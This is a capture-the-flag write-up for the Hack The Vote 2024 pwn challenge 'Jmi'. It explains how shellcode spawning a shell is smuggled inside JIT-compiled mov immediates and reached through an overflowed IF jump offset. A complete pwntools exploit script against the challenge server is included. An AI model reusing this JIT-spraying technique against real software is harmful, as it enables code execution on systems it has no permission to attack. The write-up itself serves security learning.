---
title: Hack The Vote 2024 - Jmi
date: 2024-11-03
categories: [CTF, writeup]
tags: [ctf, writeup, HackTheVote]     # TAG names should always be lowercase
---

![Puntuacion](https://raw.githubusercontent.com/elchals/elchals.github.io/main/assets/images/HackTheVote/JMI.png)  

- **Category:** Pwn.  
- **Points:** 430
- **Solves:** 22  
- **Author:** negasora  

## Description
Jmi is a challenge that I found very interesting, and it took me quite a while to solve. When we run the program, it allows us to input a code created with bytecode, with a maximum length of 0x1000 bytes. Afterward, this code is "compiled" by translating the bytecode into shellcode, and finally, it is executed.  
The bytecodes are very simple and there are only four of them:  
- `ADD`: Accepts an argument and simply adds the value of the argument to a global variable called REGISTER. This variable is later used as a condition to execute the IF statement: if REGISTER is not zero, the condition is true; if REGISTER is zero, the condition is false.  
- `PRINT`: Takes no arguments and is only used to print the value of REGISTER.  
- `TIMES`: Requires an argument and a command. TIMES executes the specified command the number of times indicated by the argument.  
- `IF`: If REGISTER is not zero, it executes the commands until it encounters an ENDIF. If REGISTER is zero, it skips directly to the command following ENDIF.  

Since these bytecodes are very simple and limited, they don't allow us to retrieve the flag directly in any way.  

The file has the following protections:  

```sh
[*] '/home/elchals/CTFs/HackTheVote/jmi/handout/challenge_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```  

## Exploitation
Since the bytecode needs to be **JIT** compiled before it is executed, the program allocates a buffer of 0x41000 bytes with **rwx** permissions, where the shellcode will be written and executed.  
From the beginning, my idea was to exploit the **ADD** function, which is translated into the shellcode `mov rdi, value`, to inject smuggled shellcode within this `mov` instruction and then jump to this shellcode to execute it.  

The concept was clear, but finding a way to jump to my shellcode proved challenging and took me a few hours to figure out.  
First, I’ll explain how to use `mov` instructions to embed smuggled shellcode, and then I'll detail how I managed to jump to my shellcode to execute it.  

## Smuggled shellcode
When we execute a bytecode like ADD 0xdeadbeef, it is translated into shellcode like the following:  
```asm
   0x7ffff7f76000:	movabs rdi,0xdeadbeef
   0x7ffff7f7600a:	movabs rax,0x555555555400
   0x7ffff7f76014:	call   rax
```
Since the eight bytes of the `mov` instruction are under our control, we can use these eight bytes to write our shellcode there. With only eight bytes, we can't do much, but we can use multiple **ADD** bytecodes to write our shellcode in small 8-byte blocks.   However, we can’t use all eight bytes of each mov instruction because we need to jump from one block to the next.  

Each bytecode is translated into shellcode and then padded with **NOPs** to fill a 0x41-byte block. This means that if we write several ADD instructions in sequence, they will be separated by exactly 0x41 bytes. So, to jump from one block of our shellcode to the next, we need to make a jump of 0x41 bytes. The assembly opcodes for this jump are `0x39eb`. Since each jump occupies two bytes, this leaves us with six bytes for our shellcode plus two for the jump.  
For example, the following bytecode will allow me to execute `xor rax, rax, xor rsi, rsi`, and jump to the next block of shellcode.   
```py
ADD(0x39ebf63148c03148) # xor rax,rax - xor rsi,rsi + JMP
```
This is what my smuggled shellcode would look like to execute the `execve("/bin/sh", NULL, NULL)` syscall:  
```asm
   0x7ffff7f76004:	xor    rdi,rdi
   0x7ffff7f76007:	nop
   0x7ffff7f76008:	jmp    0x7ffff7f76043

   0x7ffff7f76043:	xor    rax,rax
   0x7ffff7f76046:	xor    rsi,rsi
   0x7ffff7f76049:	jmp    0x7ffff7f76084

   0x7ffff7f76084:	nop
   0x7ffff7f76085:	nop
   0x7ffff7f76086:	push   rax
   0x7ffff7f76087:	xor    rdx,rdx
   0x7ffff7f7608a:	jmp    0x7ffff7f760c5

   0x7ffff7f760c5:	nop
   0x7ffff7f760c6:	mov    eax,0x68732f
   0x7ffff7f760cb:	jmp    0x7ffff7f76106

   0x7ffff7f76106:	nop
   0x7ffff7f76107:	nop
   0x7ffff7f76108:	shl    rax,0x20
   0x7ffff7f7610c:	jmp    0x7ffff7f76147

   0x7ffff7f76147:	add    rax,0x6e69622f
   0x7ffff7f7614d:	jmp    0x7ffff7f76188

   0x7ffff7f76188:	nop
   0x7ffff7f76189:	nop
   0x7ffff7f7618a:	push   rax
   0x7ffff7f7618b:	xor    rax,rax
   0x7ffff7f7618e:	jmp    0x7ffff7f761c9

   0x7ffff7f761c9:	nop
   0x7ffff7f761ca:	nop
   0x7ffff7f761cb:	nop
   0x7ffff7f761cc:	nop
   0x7ffff7f761cd:	push   rsp
   0x7ffff7f761ce:	pop    rdi
   0x7ffff7f761cf:	jmp    0x7ffff7f7620a

   0x7ffff7f7620a:	mov    ax,0x3b
   0x7ffff7f7620e:	syscall
``` 

## Jumping to the smuggled shellcode.  
Now that we have our shellcode written in a memory section with execution permissions, the 'only' thing left is to jump to it to execute it and get the shell.  
This was the challenging part of the challenge for me, and it took me a long time to find the bug that allowed me to execute the shellcode. In the end, I managed to do it as follows.  
The `IF` bytecode works as follows:  
```
IF
ADD 0xdeadbeef
ADD 0xdeadbeef
ENDIF
PRINT
```
In the previous example, what would happen is that when executing the `IF` statement, if the global variable `REGISTER` is not zero, the `ADD` instructions would be executed; otherwise, it would jump and execute the `PRINT`.  
Since all of this needs to be translated into shellcode, it is necessary to count the number of instructions within the `IF` block before it can be written.  
In the previous case, there are two instructions within the `IF` block, and knowing that each bytecode will occupy 0x41 bytes, this will be translated into a conditional jump of `0x41 * 3 bytes`.  
This doesn't help us much because jumping in multiples of 0x41 bytes is ineffective, as it will jump to the beginning of the `mov` instruction and not to the shellcode it contains.  
The trick is that the argument of this conditional jump is a signed integer, so if we manage to write a value like 0xffffffc3 there, it would translate to a negative value of 61 bytes. This means it would jump backward 61 bytes, and by coincidence, this jump is exactly the right distance to jump to a smuggled shellcode that we have in a previous `ADD`.  
Now the problem is how to make the IF have such a large jump value. Since there isn't enough space in the 0x1000 bytes of the input buffer for that many bytecodes. We can achieve this thanks to the `TIMES` bytecode. This bytecode allows us to repeat an instruction up to 99 times by doing something like `TIMES 99 ADD 0xdeadbeef`, but that's still not enough. To write such a large number, we can do something like this: `TIMES 99 TIMES 99 TIMES 99 TIMES 99 ADD 0xdeadbeef`, and with a single line, we can write a very large value.  
Now it’s a matter of doing some math to write the offset to our shellcode and be able to execute it. One last thing we need to do is set the global variable `REGISTER` to zero before calling the `IF` to force the jump to the shellcode. This can be achieved with the line:  
```py
ADD(0x10000000000000000-0x9470da9321ce9c6)

``` 

## Code
```py
#!/bin/python3
from pwn import *

context.log_level = 'INFO'
context.terminal = ['remotinator', 'vsplit', '-x']
context.arch = 'amd64'

######################################################################################

process_name = './challenge_patched'
elf = context.binary = ELF(process_name)
libc = ELF('./libc.so.6')

HOST = "jmi.chal.hackthe.vote"
PORT = 1337

######################################################################################

gdb_script = f'''
    #set breakpoint pending on
    breakrva 0x2155    
    continue
    '''

######################################################################################

def connect():
    if args.REMOTE:
        print(f"[*] Connecting to {HOST} : {PORT}")
        p = remote(HOST, PORT, ssl=False)        
    elif args.GDB:
        print(f'[*] Debugging {elf.path}.')
        p = gdb.debug([elf.path], gdbscript=gdb_script, aslr=False)
    else:
        print(f'[*] Executing {elf.path}.')
        p = process([elf.path])
    return p

bytecode = b''

def ADD(valor):
    global bytecode  
    bytecode += b'ADD ' + str(valor).encode() + b'\n'  

def PRINT():
    global bytecode  
    bytecode += b'PRINT\n'  

def IF():
    global bytecode  
    bytecode += b'IF\n'  

def ENDIF():
    global bytecode  
    bytecode += b'ENDIF\n'  

def TIMES(num):
    global bytecode  
    bytecode += b'TIMES ' + str(num).encode() + b' TIMES 90 TIMES 90 TIMES 90 ADD 0xdeadbeefdeadbeef' + b'\n'  

def TIMES2(num):
    global bytecode  
    bytecode += b'TIMES ' + str(num).encode() + b' TIMES 90 TIMES 57 ADD 0xdeadbeefdeadbeef' + b'\n'  

def TIMES3(num):
    global bytecode  
    bytecode += b'TIMES ' + str(num).encode() + b' TIMES 52 ADD 0xdeadbeefdeadbeef' + b'\n'  

def TIMES4(num):
    global bytecode  
    bytecode += b'TIMES ' + str(num).encode() + b' ADD 0xdeadbeefdeadbeef' + b'\n'  


######################################################################################

p = connect()

ADD(0x39eb90ff31480000) # xor    rdi,rdi
ADD(0x39ebf63148c03148) # xor    rax,rax - xor    rsi,rsi
ADD(0x39ebd23148509090) # xor    rdx,rdx - push rax
ADD(0x39eb0068732fb890) # mov    eax,0x68732f 
ADD(0x39eb20e0c1489090) # shl    rax,0x20 
ADD(0x39eb6e69622f0548) # add    rax,0x6e69622f 
ADD(0x39ebc03148509090) # push rax - xor rax, rax
ADD(0x39eb5f5490909090) # push rsp - pop rdi
ADD(0x39eb050f003bb866) # mov    ax,0x3b - syscall

ADD(0x10000000000000000-0x9470da9321ce9c6)

IF()
TIMES(90)
TIMES2(90)
TIMES3(90)
TIMES4(29)         
ENDIF()

p.sendlineafter(b'Code:', bytecode)

######################################################################################

p.interactive()
``` 
